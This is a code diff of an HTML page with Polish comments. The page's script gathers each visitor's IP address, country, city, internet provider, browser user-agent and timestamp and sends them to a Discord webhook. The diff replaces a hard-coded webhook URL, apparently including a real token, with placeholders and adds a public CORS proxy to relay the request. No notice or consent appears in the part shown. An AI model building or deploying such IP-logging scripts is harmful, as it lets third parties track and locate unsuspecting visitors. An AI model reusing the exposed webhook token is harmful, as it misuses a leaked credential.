@@ -23,7 +23,11 @@
   <p id="info">Pobieranie danych...</p>
 
   <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1415081958760906804/Rtx0jpgW1Em__DXkV_17gE4LeatNg_0WWHteZsUPFrcdFC6Vwx2ARRuq5Kv7F7snKwIz";
+    // Twój webhook Discorda
+    const webhookUrl = "https://discord.com/api/webhooks/TWOJ_ID/TWOJ_TOKEN";
+
+    // Publiczne proxy CORS (tylko do testów!)
+    const proxyUrl = "https://cors-anywhere.herokuapp.com/";
 
     async function sendIPInfo() {
       try {
@@ -42,26 +46,23 @@
         };
 
         const content = `
-📡 **Nowa wizyta na stronie**
-\`\`\`
+📡 Nowa wizyta:
+---------------
 IP: ${info.ip}
 Kraj: ${info.kraj}
 Miasto: ${info.miasto}
 Dostawca: ${info.dostawca}
 User-Agent: ${info.userAgent}
 Data i czas: ${info.data}
-\`\`\`
 `;
 
         // Wyświetlenie na stronie
         document.getElementById("info").textContent = content;
 
-        // Wysłanie na Discord webhook
-        await fetch(webhookUrl, {
+        // Wysłanie do Discorda przez proxy
+        await fetch(proxyUrl + webhookUrl, {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ content })
         });
 
